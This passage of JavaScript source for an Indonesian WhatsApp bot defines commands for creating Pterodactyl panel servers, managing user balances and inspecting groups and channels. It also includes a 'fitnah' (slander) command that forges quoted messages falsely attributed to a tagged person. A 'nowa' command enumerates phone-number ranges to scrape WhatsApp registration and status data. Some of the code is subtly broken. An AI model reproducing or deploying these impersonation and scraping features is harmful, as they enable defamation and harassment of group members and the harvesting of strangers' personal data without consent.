			break
			case '20gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 20gb"
				let egg = eggsnya
				let loc = location
				let memo = "20200"
				let cpu = "300"
				let disk = "20200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'unli':
			case '0gb':
			case 'unlimited': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 0gb"
				let egg = eggsnya
				let loc = location
				let memo = "0"
				let cpu = "0"
				let disk = "0"
				let email = username + "@gmail.com"
				if (!u) return
				try {
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'addb':
			case 'adduang':
			case 'addbalance':
			case 'addbal': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6287824695047 2000`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (ownerNumber.includes(users)) return m.warning('Tidak Dapat Melakukannya Kepada Owner')
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
				if (!args[1]) return m.warning(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6287824695047 2000`)
				if (isNaN(args[1])) return m.warning(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6287824695047 2000`)
				if (args[1] === 'infinity') return m.warning(`Yahaha saya ndak bisa di tipu`)
				if (args[1].includes("-")) return m.warning(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6287824695047 2000`)
				usersdb[users].saldo += parseInt(args[1])
				vreden.sendTextWithMentions(m.chat, `Sukses top up saldo sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
			}
			break
			case 'kuruang':
			case 'kurbalance':
			case 'kurbal': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6287824695047 2000`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
				if (!args[1]) return m.warning(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6287824695047 2000`)
				if (isNaN(args[1])) return m.warning(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6287824695047 2000`)
				if (args[1] === 'infinity') return m.warning(`Yahaha saya ndak bisa di tipu`)
				if (args[1].includes("-")) return m.warning(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6287824695047 2000`)
				var anu = usersdb[m.sender].saldo
				if (anu < args[1] || anu == 'undefined') return m.warning(`Saldo @${users.split("@")[0]} Tidak Mencukupi Untuk Dikurang Sebesar Rp ${args[1]}\nKetik ${prefix}saldo @${users.split("@")[0]}, untuk mengecek Saldo target!`)
				usersdb[users].saldo -= parseInt(args[1])
				vreden.sendTextWithMentions(m.chat, `Sukses kurang saldo sebesar ${args[1]} dari @${users.split("@")[0]}`, m)
			}
			break
			case 'addlimit': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6287824695047 2000`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (ownerNumber.includes(users)) return m.warning('Tidak Dapat Melakukannya Kepada Owner')
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
				if (!args[1]) return m.warning(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6287824695047 2000`)
				if (isNaN(args[1])) return m.warning(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6287824695047 2000`)
				if (args[1] === 'infinity') return m.warning(`Yahaha saya ndak bisa di tipu`)
				if (args[1].includes("-")) return m.warning(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6287824695047 2000`)
				usersdb[users].limit += parseInt(args[1])
				vreden.sendTextWithMentions(m.chat, `Sukses top up limit sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
			}
			break
			case 'addglimit':
			case 'addgamelimit': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6287824695047 2000`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (ownerNumber.includes(users)) return m.warning('Tidak Dapat Melakukannya Kepada Owner')
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
				if (!args[1]) return m.warning(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6287824695047 2000`)
				if (isNaN(args[1])) return m.warning(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6287824695047 2000`)
				if (args[1] === 'infinity') return m.warning(`Yahaha saya ndak bisa di tipu`)
				if (args[1].includes("-")) return m.warning(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6287824695047 2000`)
				usersdb[users].glimit += parseInt(args[1])
				vreden.sendTextWithMentions(m.chat, `Sukses top up game limit sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
			}
			break
			case 'me':
			case 'saldo':
			case 'limit':
			case 'balance':
			case 'ceklimit':
			case 'cekbalance': {
				try {
					let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.sender
					var mybal = usersdb[users].saldo
					var boal = pangkat(users).rank
					const _pre = require("./lib/premium");
					let premiu = JSON.parse(fs.readFileSync('./database/premium.json'));
					const isCreato = [botNumber, ...ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(users)
					const isPremi = _pre.checkPremiumUser(users, premiu)
					const gcountop = isPremi ? gcounti.prem : gcounti.user
					var limitPrib = `${usersdb[users].limit}`
					let nonya = await PhoneNumber('+' + users.replace('@s.whatsapp.net', '')).getNumber('international')
					var teke = `------------ » *ACCOUNT* « ------------\n\n*👤 Nama :* ${usersdb[users].nama}\n*🔢 Nomor :* ${nonya}\n*📦 Status :* ${isCreato ? "🤴 Developer" : isPremi ? '👑 VIP User 👑' : "Free User"}\n*💳 Limit :* ${isPremi ? 'Unlimited' : limitPrib}\n*🕹️ Limit Game :* ${usersdb[users].glimit}\n*🏦 Saldo :* Rp ${mybal}\n*🛡️ Rank :* ${boal} (${usersdb[users].rank})\n*⚔️ Level :* ${usersdb[users].level} (${usersdb[users].exp}/2500)\n\n`
					try {
						avatar = await vreden.profilePictureUrl(users, "image")
					} catch {
						avatar = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
					}
					const phon = PhoneNumber('+' + users.replace('@s.whatsapp.net', '')).getNumber('international')
					const rank = await getBuffer()
					let button = [{
						"name": "single_select",
						"buttonParamsJson": `{
  "title": "Claim Points",
  "sections": [
    {
      "title": "Weekly And Monthly",
      "rows": [
        {
          "header": "Claim Weekly Reward 🟣",
          "title": "mingguan",
          "id": ".mingguan"
        },
        {
          "header": "Claim Monthly Reward 🟡",
          "title": "bulanan",
          "id": ".bulanan"
        }
      ]
    },
    {
      "title": "Game Get Reward",
      "rows": [
        {
          "header": "Asah Otak 🧠",
          "title": "asahotak",
          "id": ".asahotak"
        },
        {
          "header": "Tebak Cak Lontong 🎴",
          "title": "caklontong",
          "id": ".caklontong"
        },
        {
          "header": "Family 100 Game 💯",
          "title": "family100",
          "id": ".family100"
        },
        {
          "header": "Lengkapi Kalimat 🕵️‍♂️",
          "title": "lengkapikalimat",
          "id": ".lengkapikalimat"
        },
        {
          "header": "Slot Game 🎰",
          "title": "slot",
          "id": ".slot"
        },
        {
          "header": "Susun Kata 🗯️",
          "title": "susunkata",
          "id": ".susunkata"
        },
        {
          "header": "Tebak Aplikasi 📱",
          "title": "tebakaplikasi",
          "id": ".tebakaplikasi"
        },
        {
          "header": "Tebak Bendera 🇮🇩",
          "title": "tebakbendera",
          "id": ".tebakbendera"
        },
        {
          "header": "Tebak Bom 💣",
          "title": "tebakbom",
          "id": ".tebakbom"
        },
        {
          "header": "Tebak Free Fire 🔫",
          "title": "tebakff",
          "id": ".tebakff"
        },
        {
          "header": "Tebak Gambar 🖼️",
          "title": "tebakgambar",
          "id": ".tebakgambar"
        },
        {
          "header": "Tebak Game 🎮",
          "title": "tebakgame",
          "id": ".tebakgame"
        },
        {
          "header": "Tebak Mobile Legends 🕹️",
          "title": "tebakhero",
          "id": ".tebakhero"
        },
        {
          "header": "Tebak Kalimat ✉️",
          "title": "tebakkalimat",
          "id": ".tebakkalimat"
        },
        {
          "header": "Tebak Kata 📠",
          "title": "tebakkata",
          "id": ".tebakkata"
        },
        {
          "header": "Tebak Kimia ☣️",
          "title": "tebakkimia",
          "id": ".tebakkimia"
        },
        {
          "header": "Tebak Lirik 🎶",
          "title": "tebaklirik",
          "id": ".tebaklirik"
        },
        {
          "header": "Tebak Siapa 👤",
          "title": "tebaksiapa",
          "id": ".tebaksiapa"
        },
        {
          "header": "Tebak Tebakan ❓",
          "title": "tebaktebakan",
          "id": ".tebaktebakan"
        },
        {
          "header": "War ⚔️",
          "title": "war",
          "id": ".war"
        },
        {
          "header": "Attack 🛡️",
          "title": "attack",
          "id": ".attack"
        },
        {
          "header": "Tebak Kabupaten 🏙️",
          "title": "tebakkabupaten",
          "id": ".tebakkabupaten"
        },
        {
          "header": "Tebak JKT48 🎤",
          "title": "tebakjkt48",
          "id": ".tebakjkt48"
        },
        {
          "header": "Tebak Hewan 🐾",
          "title": "tebakhewan",
          "id": ".tebakhewan"
        },
        {
          "header": "Tebak ML 🕹️",
          "title": "tebakml",
          "id": ".tebakml"
        },
        {
          "header": "Tebak Character 👤",
          "title": "tebakchara",
          "id": ".tebakchara"
        },
        {
          "header": "Tebak Logo 🏢",
          "title": "tebaklogo",
          "id": ".tebaklogo"
        },
        {
          "header": "Kuisioner 📝",
          "title": "kuisioner",
          "id": ".kuisioner"
        },
        {
          "header": "Werewolf 🐺",
          "title": "werewolf",
          "id": ".werewolf"
        },
        {
          "header": "Suit PvP ✊✋✌️",
          "title": "suitpvp",
          "id": ".suitpvp"
        },
        {
          "header": "Tic Tac Toe 🎮",
          "title": "tictactoe",
          "id": ".tictactoe"
        },
        {
          "header": "Casino 🎰",
          "title": "casino",
          "id": ".casino"
        }
      ]
    }
  ]
}`
					}]
					vreden.sendButtonImage(m.chat, {
						url: `https://api.vreden.my.id/api/saldo?background=https://pomf2.lain.la/f/6mtxnwrm.jpg&name=${encodeURIComponent(phon)}&level=${usersdb[users].level}&rank=${pangkat(users).name}&rankid=${pangkat(users).id}&exp=${usersdb[users].exp}&requireexp=2500&avatar=${encodeURIComponent(avatar)}`
					}, button, teke, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			// Baileys
			case 'fitnah':
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!text) return vreden.sendTextWithMentions(m.chat, `Gunakan dengan cara ${prefix+command} *@tag|pesantarget|pesanbot*\n\n_Contoh_\n\n${prefix+command} @${m.sender.split("@")[0]}|enak ga semalem|enak banget`, m)
				var org = text.split("|")[0]
				var target = text.split("|")[1];
				var bot = text.split("|")[2];
				if (!org.startsWith('@')) return m.warning('Tag orangnya')
				if (!target) return m.warning(`Masukkan pesan target!`)
				if (!bot) return m.warning(`Masukkan pesan bot!`)
				var mens = parseMention(target)
				var msg1 = {
					key: {
						fromMe: false,
						participant: `${parseMention(org)}`,
						remoteJid: m.chat ? m.chat : ''
					},
					message: {
						extemdedTextMessage: {
							text: `${target}`,
							contextInfo: {
								mentionedJid: mens
							}
						}
					}
				}
				var msg2 = {
					key: {
						fromMe: false,
						participant: `${parseMention(org)}`,
						remoteJid: m.chat ? m.chat : ''
					},
					message: {
						conversation: `${target}`
					}
				}
				vreden.sendMessage(m.chat, {
					text: bot,
					mentions: mens
				}, {
					quoted: mens.length > 2 ? msg1 : msg2
				})
				break
			case 'nowa':
				if (!isPremium) return m.tolak(mess.OnlyPrem)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *nomor*\n\n_Contoh_\n\n${prefix+command} 628XXXXXXXXXX`)
				if (text.includes('x')) return m.warning('Misal 6285xxx')
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})

				function countInstances(string, word) {
					return string.split(word).length - 1;
				}
				var nomer0 = teks.split('x')[0]
				var nomer1 = teks.split('x')[countInstances(teks, 'x')] ? teks.split('x')[countInstances(teks, 'x')] : ''
				var random_length = countInstances(teks, 'x')
				var random;
				if (random_length == 1) {
					random = 10
				} else if (random_length == 2) {
					random = 100
				} else if (random_length == 3) {
					random = 1000
				}

				var nomerny = `List Nomer\n\nPunya Bio/status/info\n`
				var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
				var no_watsap = `\nTidak Terdaftar\n`

				for (let i = 0; i < random; i++) {
					var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
					var dom1 = nu[Math.floor(Math.random() * nu.length)]
					var dom2 = nu[Math.floor(Math.random() * nu.length)]
					var dom3 = nu[Math.floor(Math.random() * nu.length)]
					var dom4 = nu[Math.floor(Math.random() * nu.length)]

					var rndm;
					if (random_length == 1) {
						rndm = `${dom1}`
					} else if (random_length == 2) {
						rndm = `${dom1}${dom2}`
					} else if (random_length == 3) {
						rndm = `${dom1}${dom2}${dom3}`
					} else if (random_length == 4) {
						rndm = `${dom1}${dom2}${dom3}${dom4}`
					}

					var anu = await vreden.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
					var anuu = anu.length !== 0 ? anu : false

					try {
						try {
							var anu1 = await vreden.fetchStatus(anu[0].jid)
						} catch {
							var anu1 = '401'
						}
						if (anu1 == '401' || anu1.status.length == 0) {
							no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
							console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
						} else {
							if (random_length == 6) {
								var thn = `${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}`
								if (thn.endsWith('2009')) {
									nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBio Name : ${anu1.status}\nTahun : ${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}\n\n`
									console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
								}
							} else {
								nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBio Name : ${anu1.status}\nTahun : ${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}\n\n`
								console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
							}
						}
					} catch {
						no_watsap += `${nomer0}${i}${nomer1}\n`
						console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [NOT REGISTERED]`, 'red'))
					}
				}
				m.reply(`${nomerny}${no_bio}${no_watsap}`)
				break
			case 'q':
			case 'quoted': {
				if (!m.quoted) return m.warning('Reply Pesannya!!')
				let gwm = await vreden.serializeM(await m.getQuotedObj())
				if (!gwm.quoted) return m.warning('Pesan Yang anda reply tidak mengandung reply')
				await gwm.quoted.copyNForward(m.chat, true)
			}
			break
			case 'fakehidetag':
				if (!isPremium) return m.warning(mess.OnlyPrem)
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!text) return vreden.sendTextWithMentions(m.chat, `Gunakan dengan cara ${prefix + command} *@tag|text*\n\n_Contoh_\n\n${prefix + command} @${m.sender.split("@")[0]}|Halo`, m)
				var org = text.split("|")[0]
				var teks = text.split("|")[1];
				if (!org.startsWith('@')) return m.warning('Tag orangnya')
				var mem2 = []
				groupMembers.map(i => mem2.push(i.id))
				var mens = parseMention(target)
				var msg1 = {
					key: {
						fromMe: false,
						participant: `${parseMention(org)}`,
						remoteJid: m.chat ? m.chat : ''
					},
					message: {
						extemdedTextMessage: {
							text: `${prefix}hidetag ${teks}`,
							contextInfo: {
								mentionedJid: mens
							}
						}
					}
				}
				var msg2 = {
					key: {
						fromMe: false,
						participant: `${parseMention(org)}`,
						remoteJid: m.chat ? m.chat : ''
					},
					message: {
						conversation: `${prefix}hidetag ${teks}`
					}
				}
				vreden.sendMessage(m.chat, {
					text: teks ? teks : '',
					mentions: mem2
				}, {
					quoted: mens.length > 2 ? msg1 : msg2
				})
				break
			case 'react':
				if (!isPremium) return rely(mess.OnlyPrem)
				if (!m.quoted) return m.warning(`Balas pesannya`)
				if (!text) return m.warning(`Masukkan 1 emoji`)
				if (!isEmoji(text)) return m.warning(`Itu bukan emoji!`)
				if (isEmoji(text).length > 1) return m.warning(`Satu aja emojinya`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: text,
						key: quoted.key
					}
				})
				break
			case 'setcmd':
			case 'addcmd': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!m.quoted) return m.warning('Reply Pesan!')
				if (!m.quoted.fileSha256) return m.warning('SHA256 Hash Missing')
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh ${prefix + command} .menu`)
				let hash = m.quoted.fileSha256.toString('base64')
				if (db.data.sticker[hash] && db.data.sticker[hash].locked) return m.warning('You have no permission to change this sticker command')
				db.data.sticker[hash] = {
					text,
					mentionedJid: m.mentionedJid,
					creator: m.sender,
					at: +new Date,
					locked: false,
				}
				m.reply(`Done!`)
			}
			break
			case 'delcmd': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let hash = m.quoted.fileSha256.toString('base64')
				if (!hash) return m.warning('SHA256 Hash Missing')
				if (db.data.sticker[hash] && db.data.sticker[hash].locked) return m.warning('You have no permission to change this sticker command')
				delete db.data.sticker[hash]
				m.reply(`Done!`)
			}
			break
			// Owners Menu
			case 'clearallgc': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
				for (let i of anulistg) {
					let metadata = await vreden.groupMetadata(i)
					await vreden.chatModify({
						delete: true,
						lastMessages: [{
							key: m.key,
							messageTimestamp: m.messageTimestamp
						}]
					}, metadata.id)
				}
				m.reply('Menghapus Semua Pesan Grup...')
			}
			break
			case 'clearallpc': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let anulistg = await store.chats.all().filter(v => v.id.endsWith('@s.whatsapp.net')).map(v => v.id)
				for (let i of anulistg) {
					await vreden.chatModify({
						delete: true,
						lastMessages: [{
							key: m.key,
							messageTimestamp: m.messageTimestamp
						}]
					}, i)
				}
				m.reply('Menghapus Semua Pesan Chat...')
			}
			break
			case 'listgc': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
				let teks = `*Group Chat*
Total: ${anulistg.length} Group\n\n`
				for (let i of anulistg) {
					let metadata = await vreden.groupMetadata(i)
					teks += `*Name :* ${metadata.subject}
*Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}
*ID :* ${metadata.id}
*Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
*Member :* ${metadata.participants.length}\n\n──────────────\n\n`
				}
				vreden.sendTextWithMentions(m.chat, teks, m)
			}
			break
			case 'listpc': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let anulistg = await store.chats.all().filter(v => v.id.endsWith('@s.whatsapp.net')).map(v => v.id)
				let teks = `*Personal Chat*
Total: ${anulistg.length} Chat\n\n`
				for (let i of anulistg) {
					teks += `*User :* @${i.split('@')[0]}\n*Chat :* https://wa.me/${i.split('@')[0]}\n\n──────────────\n\n`
				}
				vreden.sendTextWithMentions(m.chat, teks, m)
			}
			break
			case 'joingc':
			case 'join': {
				if (!isCreator) return m.warning(`Mau sewa bot buat jaga gc? silahkan hubungi owner`)
				if (!text) return m.warning(`Kirim perintah ${prefix + command} _linkgrup_`)
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.warning(mess.error.Iv)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				let result = args[0].split('https://chat.whatsapp.com/')[1]
				await vreden.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
			}
			break
			case 'getinfogc':
			case 'getinfogrup':
			case 'getgc': {
				if (!text) return m.warning(`Kirim perintah ${prefix + command} _linkgrup_`)
				if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return m.warning(mess.error.Iv)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let result = args[0].split('https://chat.whatsapp.com/')[1]
					let inpo = await vreden.groupGetInviteInfo(result)
					let teks = `*乂 GRUP LINK INFO*

*ID:* ${inpo.id}
*Name:* ${inpo.subject}
*Owner:* ${inpo.owner}
*Kirim Pesan:* ${inpo.announce ? 'Hanya Admin' : "Semua Orang"}
*Persetujuan Admin:* ${inpo.joinApprovalMode ? 'Yes' : "No"}
*Member Add Mode:* ${inpo.memberAddMode ? 'Yes' : "No"}
*Desk:*
${inpo.desc}

*Anggota Teratas:*
`
					for (let x of inpo.participants) {
						teks += `
- @${x.id.split('@')[0]}`
					}
					let button = [{
						"name": "cta_copy",
						"buttonParamsJson": `{\"display_text\":\"ID Group\",\"id\":\"${inpo.id}\",\"copy_code\":\"${inpo.id}\"}`
					}]
					vreden.sendButtonText(m.chat, button, teks, footer, m)
				} catch (error) {
					m.reply(mess.error.Iv)
				}
			}
			break
			case 'inspect':
			case 'getch':
			case 'getinfochannel':
			case 'getchid': {
				if (!text) return m.warning(`Kirim perintah ${prefix + command} _linkchannel_`)
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return m.warning(mess.error.Iv)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})

				function formatDate(timestamp) {
					const date = new Date(timestamp * 1000);
					const months = [
						'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',
						'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'
					];
					const day = date.getDate();
					const month = months[date.getMonth()];
					const year = date.getFullYear();
					return `${day} ${month} ${year}`;
				}
				try {
					let result = args[0].split('https://whatsapp.com/channel/')[1]
					let data = await vreden.newsletterMetadata("invite", result)
					let teks = `*乂 NEWSLETTER INFO*

*Name:* ${data.name}
*ID*: ${data.id}
*Status*: ${data.state}
*Dibuat Pada*: ${formatDate(data.creation_time)}
*Subscribers*: ${data.subscribers}
*Meta Verify*: ${data.verification}
*React Emoji:* ${data.reaction_codes}
*Description*:
${data.description}

`
					let button = [{
						"name": "cta_copy",
						"buttonParamsJson": `{\"display_text\":\"ID Channel\",\"id\":\"${data.id}\",\"copy_code\":\"${data.id}\"}`
					}]
					vreden.sendButtonText(m.chat, button, teks, footer, m)
				} catch (error) {
					m.reply(mess.error.Iv)
				}
			}
			break
			case 'leavegc': {
